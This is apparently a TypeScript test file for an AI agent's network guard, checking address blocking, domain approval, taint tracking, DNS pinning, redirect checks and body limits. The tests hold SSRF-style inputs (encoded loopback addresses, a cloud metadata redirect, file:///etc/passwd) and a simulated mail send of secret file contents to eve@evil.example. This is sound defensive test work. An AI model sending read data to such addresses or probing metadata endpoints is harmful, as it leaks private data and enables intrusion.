import { writeFileSync } from 'node:fs';
import { join } from 'node:path';
import type { AgentRunOptions, ApprovalRequest } from '@jarvis/core';
import { describe, expect, it } from 'vitest';
import { HomeDriver, MAX_BODY_BYTES, type ToolContext } from '../src/agents/home.js';
import type { RemoteTool } from '../src/agents/mcp-clients.js';
import {
  baseDomain,
  isBlockedAddress,
  mentionedDomains,
  overBudget,
  type PinnedFetch,
  readCapped,
  WebGuard,
} from '../src/agents/web-guard.js';
import { makeApp, tmp } from './helpers.js';

const publicResolver = async () => ['93.184.216.34'];

describe('R5 — blocked destinations', () => {
  it('blocks loopback, private, link-local, CGNAT, metadata and odd encodings', () => {
    for (const a of [
      '127.0.0.1',
      '10.1.2.3',
      '172.16.0.1',
      '192.168.1.1',
      '169.254.169.254',
      '100.64.0.1',
      '0.0.0.0',
      '::1',
      'fd00::1',
      'fe80::1',
      '::ffff:7f00:1', // hex-mapped loopback
      '::ffff:127.0.0.1',
      '[::ffff:127.0.0.1]',
      '::7f00:1', // IPv4-compatible ::/96
      '2002:c0a8:101::1', // 6to4 embedding 192.168.1.1
      '64:ff9b::a00:1', // NAT64 embedding 10.0.0.1
      '2130706433', // decimal 127.0.0.1
      '0177.0.0.1', // octal 127.0.0.1
      'not-an-ip',
    ]) {
      expect(isBlockedAddress(a), a).toBe(true);
    }
    expect(isBlockedAddress('93.184.216.34')).toBe(false);
    expect(isBlockedAddress('2606:4700::1111')).toBe(false);
  });

  it('URL parsing normalises decimal/octal hosts before the check', async () => {
    const g = new WebGuard('x', publicResolver);
    await expect(g.check(new URL('http://2130706433/'), 'GET', false)).rejects.toThrow(/private or local/);
    await expect(g.check(new URL('http://0177.0.0.1/'), 'GET', false)).rejects.toThrow(/private or local/);
    await expect(g.check(new URL('http://[::ffff:127.0.0.1]/'), 'GET', false)).rejects.toThrow(/private or local/);
    await expect(g.check(new URL('file:///etc/passwd'), 'GET', false)).rejects.toThrow(/http/);
    await expect(g.check(new URL('http://localhost:8080/'), 'GET', false)).rejects.toThrow(/local/);
  });

  it('refuses a host if ANY resolved address is private', async () => {
    const g = new WebGuard('example.com', async () => ['93.184.216.34', '10.0.0.5']);
    await expect(g.check(new URL('https://example.com/'), 'GET', false)).rejects.toThrow(/private/);
  });
});

describe('R5 — approval rules', () => {
  it('requires approval for hosts the user did not mention (exact registrable-domain match)', async () => {
    const g = new WebGuard('check crab.com and evil-github.com for me', publicResolver);
    expect((await g.check(new URL('https://ab.com/'), 'GET', false)).needsApproval).toBe(true);
    expect((await g.check(new URL('https://github.com/'), 'GET', false)).needsApproval).toBe(true);
    expect((await g.check(new URL('https://www.crab.com/'), 'GET', false)).needsApproval).toBe(false);
    expect(mentionedDomains('see https://Docs.Example.co.uk/page')).toEqual(new Set(['example.co.uk']));
  });

  it('IDN homographs do not match the real domain', async () => {
    const g = new WebGuard('open google.com', publicResolver);
    // Cyrillic "о" letters
    expect((await g.check(new URL('https://gооgle.com/'), 'GET', false)).needsApproval).toBe(true);
    expect(baseDomain('gооgle.com')).not.toBe('google.com');
  });

  it('taint: after private data was read, every unapproved host needs approval', async () => {
    const g = new WebGuard('read example.com', publicResolver);
    const url = new URL('https://example.com/');
    expect((await g.check(url, 'GET', false)).needsApproval).toBe(false);
    g.taint();
    const d = await g.check(url, 'GET', false);
    expect(d.needsApproval).toBe(true);
    expect(d.reasons.join()).toMatch(/private data/);
    g.approve(url);
    expect((await g.check(url, 'GET', false)).needsApproval).toBe(false);
  });

  it('non-GET or body always needs approval', async () => {
    const g = new WebGuard('post to example.com', publicResolver);
    expect((await g.check(new URL('https://example.com/'), 'POST', true)).needsApproval).toBe(true);
  });

  it('long or high-entropy paths/subdomains/queries count as possible exfiltration', () => {
    expect(overBudget(new URL('https://example.com/news/today'))).toBe(false);
    expect(overBudget(new URL(`https://example.com/?q=${'a'.repeat(120)}`))).toBe(true);
    expect(overBudget(new URL('https://dGhpc2lzc2VjcmV0ZGF0YTEyMzQ.example.com/'))).toBe(true);
    expect(overBudget(new URL('https://example.com/x/aB3dE5fG7hJ9kL1mN3pQ5r'))).toBe(true);
  });

  it('caps response size', async () => {
    const res = new Response('x'.repeat(5000));
    const r = await readCapped(res, 1000);
    expect(r.text).toHaveLength(1000);
    expect(r.truncated).toBe(true);
  });
});

async function homeHarness(fetchImpl: PinnedFetch, resolver = publicResolver, task = 'read example.com') {
  const t = await makeApp();
  const home = new HomeDriver({
    brain: () => t.brain,
    host: t.host,
    settings: () => t.app.settings(),
    logger: t.logger,
    projectRoots: () => [],
    home: tmp(),
    httpFetch: fetchImpl,
    resolver,
  });
  const approvals: Omit<ApprovalRequest, 'id' | 'sessionId' | 'agent'>[] = [];
  let answer: 'allow-once' | 'deny' = 'allow-once';
  const opts: AgentRunOptions = {
    task,
    cwd: tmp(),
    guidance: '',
    permission: 'full-auto',
    allowlist: [],
    signal: new AbortController().signal,
    requestApproval: async (r) => {
      approvals.push(r);
      return answer;
    },
  };
  const ctx: ToolContext = home.newContext(opts);
  return { t, home, ctx, approvals, setAnswer: (a: typeof answer) => (answer = a) };
}

describe('Home agent fetch (R5)', () => {
  it('connects to the vetted IP even if DNS changes afterwards (pinning)', async () => {
    const answers = [['93.184.216.34'], ['127.0.0.1']];
    let lookups = 0;
    const resolver = async () => answers[Math.min(lookups++, 1)] as string[];
    const seen: string[] = [];
    const f: PinnedFetch = async (_url, _init, address) => {
      seen.push(address);
      return new Response('ok', { status: 200, headers: { 'content-type': 'text/plain' } });
    };
    const h = await homeHarness(f, resolver);
    const out = await h.home.execTool('fetch_url', { url: 'https://example.com/' }, h.ctx);
    expect(out).toMatch(/^HTTP 200/);
    expect(seen).toEqual(['93.184.216.34']);
    expect(lookups).toBe(1);
  });

  it('re-validates every redirect hop and refuses redirects to private addresses', async () => {
    const f: PinnedFetch = async (url) =>
      url.hostname === 'example.com'
        ? new Response(null, { status: 302, headers: { location: 'http://169.254.169.254/latest/meta-data' } })
        : new Response('secret');
    const h = await homeHarness(f);
    await expect(h.home.execTool('fetch_url', { url: 'https://example.com/' }, h.ctx)).rejects.toThrow(
      /private or local/,
    );
  });

  it('stops after 5 redirects', async () => {
    const f: PinnedFetch = async (url) =>
      new Response(null, { status: 302, headers: { location: `https://example.com/${url.pathname.length}x` } });
    const h = await homeHarness(f);
    await expect(h.home.execTool('fetch_url', { url: 'https://example.com/' }, h.ctx)).rejects.toThrow(
      /too many redirects/,
    );
  });

  it('asks before contacting a host after the clipboard was read (taint), regardless of full-auto', async () => {
    const f: PinnedFetch = async () => new Response('ok');
    const h = await homeHarness(f);
    await h.home.execTool('clipboard_read', {}, h.ctx);
    h.setAnswer('deny');
    await expect(h.home.execTool('fetch_url', { url: 'https://example.com/a' }, h.ctx)).rejects.toThrow(/denied/);
    expect(h.approvals[0]).toMatchObject({ kind: 'network', risk: 'high' });
  });

  it('shows the full body in the approval; long bodies are auto-denied by the broker, huge ones refused', async () => {
    const f: PinnedFetch = async () => new Response('ok');
    const t = await makeApp();
    const home = new HomeDriver({
      brain: () => t.brain,
      host: t.host,
      settings: () => t.app.settings(),
      logger: t.logger,
      projectRoots: () => [],
      home: tmp(),
      httpFetch: f,
      resolver: publicResolver,
    });
    const opts: AgentRunOptions = {
      task: 'post to example.com',
      cwd: tmp(),
      guidance: '',
      permission: 'safe',
      allowlist: [],
      signal: new AbortController().signal,
      requestApproval: (r) => t.app.approvals.request({ ...r, sessionId: 's', agent: 'home', projectId: null }),
    };
    const ctx = home.newContext(opts);
    const body = 'k='.concat('v'.repeat(3000));
    await expect(
      home.execTool('fetch_url', { url: 'https://example.com/api', method: 'POST', body }, ctx),
    ).rejects.toThrow(/denied/);
    expect(t.store.listApprovalAudit()[0]).toMatchObject({ decision: 'deny', via: 'too-long' });
    expect(t.app.approvals.list()).toHaveLength(0);
    await expect(
      home.execTool(
        'fetch_url',
        { url: 'https://example.com/api', method: 'POST', body: 'x'.repeat(MAX_BODY_BYTES + 1) },
        ctx,
      ),
    ).rejects.toThrow(/too large/);
  });

  it('after reading a file, an MCP send tool needs approval with its full arguments; denied → not called', async () => {
    const t = await makeApp();
    const calls: unknown[] = [];
    const remote: RemoteTool[] = [
      { server: 'mail', name: 'send', description: 'send mail', inputSchema: {} }, // no annotations
      { server: 'mail', name: 'list', description: 'list', inputSchema: {}, readOnlyHint: true, openWorldHint: false },
    ];
    const home = new HomeDriver({
      brain: () => t.brain,
      host: t.host,
      settings: () => t.app.settings(),
      logger: t.logger,
      projectRoots: () => [],
      home: tmp(),
      mcp: {
        tools: async () => remote,
        call: async (server, tool, args) => {
          calls.push({ server, tool, args });
          return 'ok';
        },
        close: async () => undefined,
      },
    });
    const cwd = tmp();
    writeFileSync(join(cwd, 'secret.txt'), 'the launch codes');
    const approvals: { detail: string }[] = [];
    const ctx = home.newContext(
      {
        task: 'summarise secret.txt',
        cwd,
        guidance: '',
        permission: 'full-auto',
        allowlist: [],
        signal: new AbortController().signal,
        requestApproval: async (r) => {
          approvals.push(r);
          return 'deny';
        },
      },
      remote,
    );
    await home.execTool('read_file', { path: 'secret.txt' }, ctx);
    await expect(
      home.execTool('mcp:mail:send', { to: 'eve@evil.example', body: 'the launch codes' }, ctx),
    ).rejects.toThrow(/denied/);
    expect(approvals[0]?.detail).toBe('mail:send {"to":"eve@evil.example","body":"the launch codes"}');
    expect(calls).toEqual([]);
    // A strictly read-only, closed-world tool is still allowed in full-auto.
    await home.execTool('mcp:mail:list', {}, ctx);
    expect(calls).toHaveLength(1);
  });

  it('file tools stay inside allowed roots', async () => {
    const f: PinnedFetch = async () => new Response('ok');
    const h = await homeHarness(f);
    await expect(h.home.execTool('read_file', { path: join(tmp(), 'x.txt') }, h.ctx)).rejects.toThrow(
      /outside allowed/,
    );
  });
});
